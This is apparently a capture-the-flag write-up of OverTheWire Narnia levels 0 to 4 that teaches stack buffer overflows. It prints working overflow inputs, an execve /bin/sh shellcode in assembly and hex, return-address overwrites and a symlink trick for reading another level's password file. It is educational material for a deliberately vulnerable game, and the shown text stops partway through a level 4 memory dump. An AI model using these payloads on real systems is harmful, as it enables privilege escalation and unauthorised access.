# Smashing the Stack for Fun or WarGames - Narnia 0-4


One of my mentors, <a href="https://twitter.com/OwariDa"> **Joel Eriksson**</a>, suggested the quintessential **[WarGames]**, a collection of **Security problems**, divided into 14 interesting titles. I have been playing the games since last week, and they are awesome! To play the WarGames you SSH to their servers with a login that indicates your current level. The purpose of the game is to solve the current level's challenge to find the password for the next level.

Today I am talking about the first five levels of **[Narnia]**, which is all about **[buffer overflow]** and **[inputs with no bounds checking]**.


You will see that this war is not so bad when you know your weapons.


**Disclaimer**: if you haven't played WarGames, but you are planning to, PLEASE DON'T READY ANY FURTHER. If you don't try to solve the problems by yourself first, you will be wasting your time.

[inputs with no bounds checking]: http://en.wikipedia.org/wiki/Bounds_checking
[buffer overflow]: http://en.wikipedia.org/wiki/Buffer_overflow
[process's virtual memory]: http://en.wikipedia.org/wiki/Virtual_memory

--------

## How Stack Exploitation Works: A Crash Course

### A Process' Virtual Memory

When a program starts a process, the OS kernel provides it a piece of [physical memory]. However, all that the process sees is the [virtual memory space] and its size and starting address. Each time a process wants to read or write to physical memory, its request must be translated from a virtual memory address to a physical memory address.


[physical memory]: http://en.wikipedia.org/wiki/Computer_memory
[virtual memory space]: http://en.wikipedia.org/wiki/Virtual_memory


I like [Peter Jay Salzman]'s picture showing the process' virtual memory in terms of its address.

![cyber](http://i.imgur.com/RYEpFEA.png)


The *text* and *data* segments are the places where the program puts the code and the static data (*e.g*., global variables). This region is normally marked read-only, and any attempt to write to it will result in a [segmentation violation].

Notice that arguments and environment variables get a special place in the top of the Stack (higher address).

Although the [Heap] can also be fun to play with, for the purpose of these games, we will concentrate on the **Stack**. Remember, the [direction of which the Stack grows] is system-dependent.



[direction of which the Stack grows]: https://stackoverflow.com/questions/664744/what-is-the-direction-of-stack-growth-in-most-modern-systems
[segmentation violation]: http://en.wikipedia.org/wiki/Segmentation_fault
[Heap]: http://en.wikipedia.org/wiki/Heap_(data_structure)


### What's the Stack


A Stack is an *abstract data type* that has the property that the last object placed will be the first object removed. This is also known as *last-in/first-out queue* or *LIFO*. Two of the most essential operations in a Stack are *push* and *pop*.

You can think of a stack of books: the only way to reach the book in the bottom (the first book that was pushed) is by popping every book on the top. To learn how to write a Stack in Python, take a look at my notes on [Python & Algorithms]. I also made the source code available: [here are some examples].

The memory Stack frame is a collection of (stack) frames. Every time a process calls a function, it alters the flow of control. In this case, a new frame needs to be added, and the Stack grows downward (lower memory address).

If you think about it, a Stack is a perfect object for a process: the process can push a function (its arguments, code, etc.) into the Stack, then, in the end, it pops everything, back to where it started.




[Python & Algorithms]: https://github.com/autistic-symposium/master-algorithms-pyblob/master/book/book_second_edition.pdf
[here are some examples]: https://github.com/autistic-symposium/master-algorithms-pytree/master/src/abstract_structures/Stacks




### Buffer Overflows in the Stack

Buffer overflows happen when we give a buffer more information than it is meant to hold. For example, the **standard C library** has several functions for copying or appending strings with no bounds checking: ```strcat()```, ```strcpy()```, ```sprintf()```, ```vsprintf()```, ```gets()```, and ```scanf()```. These functions can easily overflow a buffer if  the input is not validated first.

To better understand this subject, I recommend the classic [Smashing the Stack for Fun or Profit] from [Aleph One], which was published in 1996 in the [Phrack magazine] number 49.

[WarGames]: http://overthewire.org/wargames
[Narnia]: http://overthewire.org/wargames/narnia
[Aleph One]: http://en.wikipedia.org/wiki/Elias_Levy
[Phrack magazine]: http://www.phrack.org/
[Smashing the Stack for Fun or Profit]: http://insecure.org/stf/smashStack.html
[Peter Jay Salzman]: http://www.dirac.org/linux/gdb/




### Assembly and the Stack Registers

Registers are small memory storage areas built into the CPU. When the process enters the Stack, a register called the **Stack pointer** (esp) points to the top of the Stack (lowest memory address). The bottom of the Stack (higher memory address) is at a fixed address (adjusted by the kernel at run time). The CPU will implement instructions to push onto and pop stuff of the Stack.

In Assembly code this looks like:

```
pushl %ebp
movl %esp,%ebp
subl $20,%esp
```

The two first lines are the prologue. In the first line of this code, the (old) **frame pointer** (ebp) is pushed onto the top of the Stack (lowest memory). Then, the current **esp** is copied into the **stack frame base pointer** (ebp), making it the new frame pointer. In the last line, space is allocated for the local variables, subtracting their size from esp (remember that memory can only be addressed in multiples of the word size, for example, 4 bytes, or 32 bits).



After this point, the Assembly code will show each operation step in the program. We will learn more about this during the challenges. It's a good skill to understand the basics of Assembly, but this is outside the context of this review. Check out this [nice Assembly guide] if you need to. Also, [this cheat sheet] is awesome.

[this cheat sheet]: http://darkdust.net/files/GDB%20Cheat%20Sheet.pdf

[nice Assembly guide]: http://www.drpaulcarter.com/pcasm/

Ah, by the way, you can look to the Assembly output in a C program by using the flag ```-S```:

```sh
$ gcc -S -o example1.s example1.c
```



----

## Narnia's WarGame

### The Scenario

In each of Narnia's levels, we are able to [run a binary and read its C code]. The objective is to figure out from the code what vulnerability can be used to allow us to read the password of the next level (located in a folder under ```/etc``` in the server).


[run a binary and read its C code]: http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/




### Your Weapons





#### Memory and Exploits Representation


When it comes to memory addresses, it's fundamental to understand [hexadecimal representation]. You can print a HEX into [ASCII] with Python:
```python
$ python -c 'print "\x41"'
A
```

Remember that Narnia's servers are [x86], so they have [little-endian] representation. This means that an address ```0xffffd546 ``` is actually written as ```\x46\xd5\xff\xff ```.

Most of the exploit we deliver in Narnia is in the form of input strings. Python with the flag, ```-c```, is really handy to craft what we need:
```sh
$ python -c 'print "A"*20'
AAAAAAAAAAAAAAAAAAAA
```

[little-endian]: http://en.wikipedia.org/wiki/Endianness
[x86]: http://en.wikipedia.org/wiki/X86
[ASCII]: http://en.wikipedia.org/wiki/ASCII
[hexadecimal representation]: http://en.wikipedia.org/wiki/Hexadecimal


#### Environment Variables

If you look to the picture above, you see that the system environment variables are available within the Stack. This can be useful to some exploits, where we can use these variables to import payloads.

To define an environment variable, we use ```export```. To print its value, you can use ```echo``` or ```env```:
```sh
$ EGG="0X41414141"
$ echo $EGG
0X41414141
$ export EGG
$ env | grep EGG
EGG=0X41414141
```

To understand more about environments variables in exploits, take a look into my [Shellshock guide].

[Shellshock guide]: http://https://singularity-sh.vercel.app/understanding-the-shellshock-vulnerability.html


#### Shell Commands

The shell commands that are useful for these problems are:


* ```readelf```: Displays information about ELF files (the binaries). For example, a detail that will be important soon is the fact that, in Narnia, the *Stack is executable*. This means that we can place shellcode within it. To check whether the Stack is executable see if the following output has the flag **E**:
```sh
narnia1@melinda:/narnia$ readelf -a narnia1 | grep GNU_STACK
 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```


* ```xxd```: Creates a hex dump of a given file or standard input. It can also convert a hex dump back to its original binary form.

* ```whoami```: Shows the current user, good to see whether the exploit worked!



### gdb and objdump

In most of the problems in Narnia, it's fundamental do understand how to debug the binary with **gdb**.


[very introductory guide]: http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/
[comprehensive guide]: http://www.dirac.org/linux/gdb/


To learn more about gdb, you might want to check this [very introductory guide] or this [comprehensive guide]. However, in any problem in Narnia these steps are enough:

* To start a gdb instance: ```gdb -q <EXECUTABLE>```.
* To get the Assembly code we use the ```disassemble``` command. Constants are prefixed with a $ and registers with a %:
```
(gdb) set disassembly-flavor intel
(gdb) disas main
```



* To set breakpoints to the address to inspect, based on the values from the output above:
```
(gdb) b *main+<SOME NUMBER>
```

* To run the program: ```(gdb) r```. We also can use ```c``` to continue to run it after the breakpoint. We can use ```n``` for the next program line. We can print things using ```p```.

* To examine some memory address, we can use ```(gdb) x/nfu A```, where **A** is the address (*e.g.*, ```$esp``), n is the number of units to print, f is the format character, and u is the unit.

* To examine the Stack frame: ```(gdb) i f```. We can also look at the Stack by using ```bt``` (backtrace).



* When you start using gdb frequently, it's useful to have a file with starting commands. For example:

```sh
$ gdb <program name> -x <command file>
```

Where:
```sh
$ cat command.txt
set disassembly-flavor intel
disas main
```

Or you can have a nice **.gdbinit** setup with lines such as:
```
set disassembly-flavor intel
set follow-fork-mode child
```



As a note, there are other **disassembles** that you might want to try instead of gdb:

* The shell command **objdump -d**, which display the Assembly information from object files.
* <a href="https://www.hex-rays.com/products/ida/index.shtml"> IDA Pro</a>.
* <a href="http://www.zynamics.com/binnavi.html">BinNavi</a>.
* <a href="http://www.hopperapp.com/">Hopper Disassembler</a>.
* <a href="http://linux.die.net/man/1/readelf">readelf</a>.




--------------

## Level 0: Classic Stack Overflow to rewrite a Variable


### Step 1: Understanding the Problem

The first level starts with:

```sh
narnia0@melinda:/narnia$ cat narnia0.c

#include <stdio.h>
#include <stdlib.h>

int main(){
 long val=0x41414141;
 char buf[20];

 printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
 printf("Here is your chance: ");
 scanf("%24s",&buf);

 printf("buf: %s\n",buf);
 printf("val: 0x%08x\n",val);

 if(val==0xdeadbeef)
 system("/bin/sh");
 else {
 printf("WAY OFF!!!!\n");
 exit(1);
 }

 return 0;
}
```

The program receives an input from the user and saves it in a buffer variable of size 20. Then, it checks if the *val* is equal to a different value of what it was declared:
```c
if(val==0xdeadbeef)
 system("/bin/sh");
```
Since *val* obviously didn't change anywhere in the program, nothing happens, and the program exits normally.

However, if somehow we could change the value of *val* to [0xdeadbeef], the program will give us a privileged shell!


[0xdeadbeef]: http://en.wikipedia.org/wiki/Hexspeak

Let's think about the memory Stack. Just like in a pile of books, the local variables are pushed in the order that they are created. In the case above, *val* is pushed before *buf*, so *val* is in a higher memory address:
```c
 long val=0x41414141;
 char buf[20];
```

What happens if the input is larger than 20 bytes? In this case, there are no bounds checking, and the input overflows the variable *buf*, occupying the following space in the Stack: *val*. This is a classic case of **Stack Overflow**!



### Step 2: Visualizing the Overflow


The plan is to overflow *buf* with 20+4 bytes so that the last four bytes overwrites *val* with ```0xdeadbeef```.

Let's see how *val* is filled when we overflow byte by byte:


```sh
narnia0@melinda:/narnia$ python -c 'print "B"*24'
BBBBBBBBBBBBBBBBBBBBBBBB

narnia0@melinda:/narnia$ (python -c 'print "B"*19') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBB
val: 0x41414141
WAY OFF!!!!


narnia0@melinda:/narnia$ (python -c 'print "B"*20') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBB
val: 0x41414100
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*21') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBB
val: 0x41410042
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*22') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBB
val: 0x41004242
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*23') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBB
val: 0x00424242
WAY OFF!!!!

narnia0@melinda:/narnia$ (python -c 'print "B"*24') | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
```

### Step 3: Crafting the Exploit

Now we know that `val` starts to overflow in the 20th byte. All we need to do is to add ```deadbeef``` in the last four bytes.

However, we need to write this in hexadecimal form:

```sh
narnia0@melinda:/narnia$ python -c'print "A"*20 + "\xef\xbe\xad\xde"'
AAAAAAAAAAAAAAAAAAAAﾭ
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"') | ./narnia0 Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
```

Yay, the exploit worked!


### Step 4: Getting Access to the Shell


We were able to get access to our shell, but it closed too fast when the program execution ended.

We need to create a way to read the password before we lose the control to the shell. A good way is pipelining some command that waits for input, such as ```tail``` or ```cat```.

It turns out that only ```cat``` actually prints the output:

```sh
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
```
Done! We have completed the 0th level!


### Step 5: Debugging it!
Although this problem was easy enough so we didn't need to debug anything, it's a good call to understand the process while the challenge is easy:

```sh
narnia0@melinda:/narnia$ gdb ./narnia0
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
 0x080484c4 <+0>: push ebp
 0x080484c5 <+1>: mov ebp,esp
 0x080484c7 <+3>: and esp,0xfffffff0
 0x080484ca <+6>: sub esp,0x30
 0x080484cd <+9>: mov DWORD PTR [esp+0x2c],0x41414141
 0x080484d5 <+17>: mov DWORD PTR [esp],0x8048640
 0x080484dc <+24>: call 0x80483b0 <puts@plt>
 0x080484e1 <+29>: mov eax,0x8048673
 0x080484e6 <+34>: mov DWORD PTR [esp],eax
 0x080484e9 <+37>: call 0x80483a0 <printf@plt>
 0x080484ee <+42>: mov eax,0x8048689
 0x080484f3 <+47>: lea edx,[esp+0x18]
 0x080484f7 <+51>: mov DWORD PTR [esp+0x4],edx
 0x080484fb <+55>: mov DWORD PTR [esp],eax
 0x080484fe <+58>: call 0x8048400 <__isoc99_scanf@plt>
 0x08048503 <+63>: mov eax,0x804868e
 0x08048508 <+68>: lea edx,[esp+0x18]
 0x0804850c <+72>: mov DWORD PTR [esp+0x4],edx
(...)
End of assembler dump.
```
Let's put a break point right after ```scanf```:

```sh
(gdb) b *main+63
Breakpoint 1 at 0x8048503
```

We run the debugged program with 20 Bs (\x42) as the input. It stops in the address above, right after ```scanf```:
```sh
(gdb) r
Starting program: /games/narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance:

Breakpoint 1, 0x08048503 in main ()
```

Now we examine the memory in, say, 12 counts:

```sh
(gdb) x/12xw $esp
0xffffd6a0: 0x08048689 0xffffd6b8 0x08049ff4 0x08048591
0xffffd6b0: 0xffffffff 0xf7e59d46 0x42424242 0x42424242
0xffffd6c0: 0x42424242 0x42424242 0x42424242 0x41414100
```

The variable *buf* is in the 7-11th entries (0x42424242). Right after that is *val* (which we know is still 0x41414141). Wait, do you see the two zeros in ```0x41414100```? This is the space at the end of *buf*

Finally, we test with 20 Bs + 4 Cs and confirm that our exploit works:

```sh
(gdb) x/12xw $esp
0xffffd6a0: 0x08048689 0xffffd6b8 0x08049ff4 0x08048591
0xffffd6b0: 0xffffffff 0xf7e59d46 0x42424242 0x42424242
0xffffd6c0: 0x42424242 0x42424242 0x42424242 0x43434343
```


---

## Level 1: Stack Overflow with Environment Variables

### Step 1: Understanding the Problem

The second level starts with:
```c
narnia1@melinda:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG

narnia1@melinda:/narnia$ cat narnia1.c
#include <stdio.h>

int main(){
 int (*ret)();

 if(getenv("EGG")==NULL){
 printf("Give me something to execute at the env-variable EGG\n");
 exit(1);
 }

 printf("Trying to execute EGG!\n");
 ret = getenv("EGG");
 ret();

 return 0;
}
```

The program searches for an environment variable **EGG** and then it exits if this variable doesn't exist. If it does, **EGG**'s value is passed as a function. Really secure.



### Step 1: Creating an Environment Variable with our Exploit

The most obvious option for an exploit is to spawn a privileged shell, so that we can read the next level's password.

Let's suppose we don't know that we need to write the exploit in memory language. We could try this:
```sh
narnia1@melinda:/narnia$ export EGG="/bin/ls"
narnia1@melinda:/narnia$ echo $EGG
/bin/ls
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
```

Nope.

We actually need to create a hexadecimal command to export to **EGG**. We do this in Assembly and all the information we need is in the [Appendix A] from [Aleph One]'s paper. This allows us to write the following:

[Appendix A]: http://insecure.org/stf/smashStack.html



```sh
narnia1@melinda:/tmp$ vi shellspawn.asm
xor eax, eax ; make eax equal to 0
push eax ; pushes null
push 0x68732f2f ; pushes /sh (//)
push 0x6e69622f ; pushes /bin
mov ebx, esp ; passes the first argument
push eax ; empty third argument
mov edx, esp ; passes the third argument
push eax ; empty second argument
mov ecx, esp ; passes the second argument
mov al, 11 ; execve system call #11
int 0x80 ; makes an interrupt
```

Compiling:

```sh
narnia1@melinda:/tmp$ nasm shellspawn.asm
narnia1@melinda:/tmp$ ls
shellspawn shellspawn.asm
narnia1@melinda:/tmp$ cat shellspawn
1�Ph//shh/bin��P��P���
```

Exporting it to *EGG*:

```sh
narnia1@melinda:/tmp$ export EGG=$(cat shellspawn)
```
We are ready to exploit the binary:

```sh
narnia1@melinda:/tmp$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```



### Step 4: Convert it to Hexadecimal

It's really useful to have a hexadecimal form of our exploit (as we will see in the next levels) so we will use ```xxd``` to read it:

```sh
narnia5@melinda:/tmp$ xxd shellspawn
0000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350 1.Ph//shh/bin..P
0000010: 89e2 5089 e1b0 0bcd 80 ..P......
```

Awesome! We can go ahead and test it:
```sh
narnia1@melinda:/tmp$ export EGG=`python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"'`
narnia1@melinda:/tmp$ /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```


----------


## Level 2: Stack Overflow to the Return Address

### Step 1: Understanding the Problem:

The third level starts with:

```
narnia2@melinda:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@melinda:/narnia$ cat narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
 char buf[128];

 if(argc == 1){
 printf("Usage: %s argument\n", argv[0]);
 exit(1);
 }
 strcpy(buf,argv[1]);
 printf("%s", buf);

 return 0;
}
```

This function copies an input string to a *buf*, using ```strcpy()``` (instead of safer ```strncpy()```). Since there is no bounds checking, *buf* overflows to the higher address in the Stack if the input is larger than 128 bytes.

In this problem, we will use overflow to take control of the return address of the main function, which is right after *buf*. We will overwrite this to any address we want, for example to the address of a beautifully crafted exploit.


### Step 2: Finding the Frame Size

To find where the returning address of this function is located, we use *gdb*:

```sh
narnia2@melinda:/narnia$ gdb ./narnia2
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
 0x08048424 <+0>: push ebp
 0x08048425 <+1>: mov ebp,esp
 0x08048427 <+3>: and esp,0xfffffff0
 0x0804842a <+6>: sub esp,0x90
 0x08048430 <+12>: cmp DWORD PTR [ebp+0x8],0x1
 0x08048434 <+16>: jne 0x8048458 <main+52>
 0x08048436 <+18>: mov eax,DWORD PTR [ebp+0xc]
 0x08048439 <+21>: mov edx,DWORD PTR [eax]
 0x0804843b <+23>: mov eax,0x8048560
 0x08048440 <+28>: mov DWORD PTR [esp+0x4],edx
 0x08048444 <+32>: mov DWORD PTR [esp],eax
 0x08048447 <+35>: call 0x8048320 <printf@plt>
 0x0804844c <+40>: mov DWORD PTR [esp],0x1
 0x08048453 <+47>: call 0x8048350 <exit@plt>
 0x08048458 <+52>: mov eax,DWORD PTR [ebp+0xc]
 0x0804845b <+55>: add eax,0x4
 0x0804845e <+58>: mov eax,DWORD PTR [eax]
 0x08048460 <+60>: mov DWORD PTR [esp+0x4],eax
 0x08048464 <+64>: lea eax,[esp+0x10]
 0x08048468 <+68>: mov DWORD PTR [esp],eax
 0x0804846b <+71>: call 0x8048330 <strcpy@plt>
 0x08048470 <+76>: mov eax,0x8048574
 0x08048475 <+81>: lea edx,[esp+0x10]
 0x08048479 <+85>: mov DWORD PTR [esp+0x4],edx
 0x0804847d <+89>: mov DWORD PTR [esp],eax
 0x08048480 <+92>: call 0x8048320 <printf@plt>
 0x08048485 <+97>: mov eax,0x0
 0x0804848a <+102>: leave
 0x0804848b <+103>: ret
End of assembler dump.
```

We create a breakpoint right before the exit:

```
(gdb) b *main+97
Breakpoint 1 at 0x8048485
```

We run our program, feeding it with an argument of size 30 and we look to the memory (esp is the Stack pointer). The second value, **0xffffd610**, indicates the start of the frame:
```
(gdb) r `python -c 'print "B"*30'`
(gdb) x/30xw $esp
0xffffd600: 0x08048574 0xffffd610 0x00000001 0xf7ebf729
0xffffd610: 0x42424242 0x42424242 0x42424242 0x42424242
0xffffd620: 0x42424242 0x42424242 0x42424242 0xf7004242
0xffffd630: 0x08048258 0x00000000 0x00ca0000 0x00000001
0xffffd640: 0xffffd86d 0x0000002f 0xffffd69c 0xf7fcaff4
0xffffd650: 0x08048490 0x08049750 0x00000002 0x080482fd
0xffffd660: 0xf7fcb3e4 0x00008000 0x08049750 0x080484b1
0xffffd670: 0xffffffff 0xf7e59d46
```

Now, looking to the information about the frame, we get the return address at **0xffffd69c**:

```
(gdb) i f
Stack level 0, frame at 0xffffd6a0:
 eip = 0x8048485 in main; saved eip 0xf7e404b3
 Arglist at 0xffffd698, args:
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
 ebp at 0xffffd698, eip at 0xffffd69c
```

To find the size of the frame we subtract these values:

```
(gdb) p 0xffffd69c-0xffffd610
$1 = 140
```

So we know that 140 bytes are needed to reach the return address, where we will add our pointer.



### Step 3: Finding the EGG ShellCode Address

Where do we want to point the return address to? Well, we already know a way to spawn a shell: using an environment variable:

```sh
narnia2@melinda:/tmp$ export EGG=`python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80"'
```

To find the address of **EGG** we use the following **C** code:
```c
narnia2@melinda:/tmp$ cat getbashadd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc,char *argv[]){
 char *ptr;
 ptr = getenv(argv[1]);
 ptr += (strlen(argv[0])-strlen(argv[2]))*2;
 printf("%s is at %p\n", argv[1],ptr);
 return 0;
}
```

Running it gives:

```
narnia2@melinda:/tmp$ ./getshadd EGG /narnia/narnia2
EGG will be at 0xffffd945
```

### Step 4: Running the Exploit!

Now all we need to do is to run the binary with 140 bytes of junk plus the address that we want to point the return address to:

```sh
narnia2@melinda:/tmp/ya2$ /narnia/narnia2 `python -c 'print "A"*140 + "\x45\xd9\xff\xff"'`
$ whoami
narnia3
```


------

## Level 3: Stack Overflow, Files, and Symbolic Links

### Step 1: Understanding the Problem

The fourth level starts with:

```sh
narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@melinda:/narnia$ cat narnia3.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

 int ifd, ofd;
 char ofile[16] = "/dev/null";
 char ifile[32];
 char buf[32];

 if(argc != 2){
 printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
 exit(-1);
 }

 /* open files */
 strcpy(ifile, argv[1]);
 if((ofd = open(ofile,O_RDWR)) < 0 ){
 printf("error opening %s\n", ofile);
 exit(-1);
 }
 if((ifd = open(ifile, O_RDONLY)) < 0 ){
 printf("error opening %s\n", ifile);
 exit(-1);
 }

 /* copy from file1 to file2 */
 read(ifd, buf, sizeof(buf)-1);
 write(ofd,buf, sizeof(buf)-1);
 printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

 /* close 'em */
 close(ifd);
 close(ofd);

 exit(1);
}
```

This program receives a file name as input, and then copies the content of this file to a second file pointing to ```/dev/null```.

What is particularly interesting to us is the order that the variables are declared:

```c
char ofile[16] = "/dev/null";
char ifile[32];
```


[/dev/null]: http://en.wikipedia.org/wiki/Null_device


### Step 2: Understanding what is going on in the Memory

Let's debug this binary to see how we can exploit it. First with a simple 3-bytes input:

```
(gdb) set args "`python -c 'print "a"*3'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*3'`"
error opening aaa
```

OK, it makes sense, there is no such file. Now let's try the size of *ifile*:

```
(gdb) set args "`python -c 'print "a"*32'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*32'`"
error opening
```

Mmm, interesting. It does not input any name. Let's try one byte less:

```
(gdb) set args "`python -c 'print "a"*31'`"
(gdb) r
Starting program: /games/narnia/narnia3 "`python -c 'print "a"*31'`"
error opening aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The previous example showed the first byte after overflowing *ifile*. This last example ends in the last possible byte in the array. Once we overflow *ifile*, it skips the checking, going straight to check whether *ofile* is a valid name. Awesome!



### Step 3: Writing and Applying the Exploit

We want two things happening in *ifile*: first, to read the password file, then to overflows *ofile*, making it point to a file we have access to read.

The best way to put all of this in one input name is by creating a symbolic link with the following rules:

1. Point to */etc/narnia_pass/narnia4*.
2. Fill the 32 bytes of the *ifile* array with junk.
3. End with some file name which we had created before, and we have permission to read (we can just use ```touch``` to create an empty file).

The result, for a file name *out*, is:
```sh
$ ln -s /etc/narnia_pass/narnia4 $(python -c "print 'A'*32 + 'out'")
```

Now we can just run it and retrieve our password:
```sh
narnia3@melinda:/tmp$ /narnia/narnia3 `python -c "print 'A'*32 + 'out'"`copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAout to a safer place... (out)
narnia3@melinda:/tmp$ cat out
```





_______


## Level 4: Classic Buffer Overflow with NOP

### Step 1: Understanding the Problem

This fifth level starts with:

```sh
narnia4@melinda:/narnia$ ./narnia4
narnia4@melinda:/narnia$ cat narnia4.c

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
 int i;
 char buffer[256];

 for(i = 0; environ[i] != NULL; i++)
 memset(environ[i], '\0', strlen(environ[i]));

 if(argc>1)
 strcpy(buffer,argv[1]);

 return 0;
}
```

This binary does three things: first, it creates a buffer array of size 256, then it makes all of the system environment variables equal to zero, and then it copies whatever user input it had to the buffer.

The reason why this code clears the environment variables is to avoid the possibility of us placing a shellcode exploit to them (like we did in Level 2).



### Step 2: Outlining the Attack


To exploit this binary we are going to overwrite our **return address** like in level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:

1. Find out the size of the Stack. Just having the return address won't help since we can't point it to anywhere outside the code.
2. Create a shellcode with the return address minus some value we define so that the return address points to somewhere inside the Stack.
3. Fill the beginning of the Stack with lots of [NOPs] (No Operations, used to pad/align bytes or to delay time), which in the x86 CPU family is represented with ```0x90```. If the pointer hits these places, it just keeps advancing until it finds our shell.
4. To make everything fit right in the Stack frame, we pad the end of the shellcode with junk.
.

[ASLR]: http://en.wikipedia.org/wiki/Address_space_layout_randomization
[NOPs]: http://en.wikipedia.org/wiki/NOP




### Step 3: Getting the Frame Size


With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag ```--args``` because otherwise we will get an error that the name is too long:

```sh
narnia4@melinda:/narnia$ gdb --args narnia4 `python -c "print 'A'*256"`
Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
 0x08048444 <+0>: push ebp
 0x08048445 <+1>: mov ebp,esp
 0x08048447 <+3>: push edi
 0x08048448 <+4>: and esp,0xfffffff0
 0x0804844b <+7>: sub esp,0x130
(..)
 0x080484f0 <+172>: call 0x8048350 <strcpy@plt>
 0x080484f5 <+177>: mov eax,0x0
 0x080484fa <+182>: mov edi,DWORD PTR [ebp-0x4]
 0x080484fd <+185>: leave
 0x080484fe <+186>: ret
End of assembler dump.
```

We put a breakpoint right before the Stack ends:

```sh
(gdb) b *main+182
Breakpoint 1 at 0x80484fa
```

Running:

```sh
(gdb) r
Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

We see that the frame starts at **0xffffd4cc**:

```sh
(gdb) x/90xw $esp
0xffffd4a0: 0xffffd4cc 0xffffd7be 0x00000021 0xf7ff7d54
0xffffd4b0: 0xf7e2ae38 0x00000000 0x00000026 0xffffffff
0xffffd4c0: 0x00000000 0x00000000 0x00000001 0x41414141
0xffffd4d0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd4e0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd4f0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd500: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd510: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd520: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd530: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd540: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd550: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd560: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd570: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd580: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd590: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd5a0: 0x41414141 0x41414141 0x41414141 0x41414141
0xffffd5b0: 0x41414141 0x41414141 0x41414141 0x41414141
